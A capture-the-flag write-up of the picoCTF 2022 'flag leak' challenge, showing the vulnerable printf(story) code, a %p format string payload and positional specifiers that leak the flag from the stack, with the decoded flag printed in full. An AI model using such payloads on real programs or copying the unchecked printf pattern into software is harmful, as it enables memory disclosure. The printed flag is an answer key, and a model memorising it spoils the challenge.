# flag leak #
 
## Overview ##

Category: [Binary Exploitation](../../)

Topics: Binary Exploitation, picoCTF-2022, Format String Vulnerability

## Description ##
Story telling class 1/2 
I'm just copying and pasting with this program. What can go wrong? You can view source here.

## Approach ##
I am provided with a binary file called `vuln` and a C file called `vuln.c`. Before I inspect the C file, I check the binary security of the file using `checksec`:

    Arch:     i386
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

Other than PIE being disabled, there is nothing of note. I then inspect the C file and notice that the `vuln` functions calls `readflag` function to read the flag from the `flag.txt` file and stores it in the `flag` variable. It also gets the user input via `scanf` and stores it in the `story` variable. From there, it prints the `story` variable directly:

    void vuln(){
    char flag[BUFSIZE];
    char story[128];

    readflag(flag, FLAGSIZE);

    printf("Tell me a story and then I'll tell you one >> ");
    scanf("%127s", story);
    printf("Here's a story - \n");
    printf(story);
    printf("\n");
    }

Since the `flag` variable is stored in the stack and the `story` variable is printed directly, this allows me to use a format string vulnerability to leak the flag. I can spam a bunch of `%p` format specifiers to print the contents of the stack. Since I know the flag starts with `picoCTF{`, I just need to find `70 69 63 6f 43 54 46 7b` in little endian:

    Tell me a story and then I'll tell you one >> %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
    Here's a story -
    0xffcc93b0.0xffcc93d0.0x8049346.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x252e70.0x6f636970.0x7b465443.0x6b34334c.0x5f676e31.0x67346c46.0x6666305f.0x3474535f.

I notice around the 37th position, it looks like the leaked flag. So translating the hex, I get `picoCTF{L34k1ng_Fl4g_0ff_St4`. Since I don't have the full flag, I try to find the rest of the flag by using `%43$p.%44$p.%45$p.`. This will leak the memory address at 43th, 44th, and 45th position, this got me the rest of the flag:

    Tell me a story and then I'll tell you one >> %43$p.%44$p.%45$p
    Here's a story -
    0x395f6b63.0x32653939.0x7d343238

Translating the hex, I got `ck_999e2824}` 

Flag: picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}

## Reflection ## 
This challenge is a format string vulnerability where user-controlled input was passed directly to printf. By using `%p` and `%#p`, I was able to leak stack memory and recover the flag, showing how improper format string handling can lead to information disclosure without any memory corruption. This is one of many example of the consequences of directly printing user-controlled input without any validation.

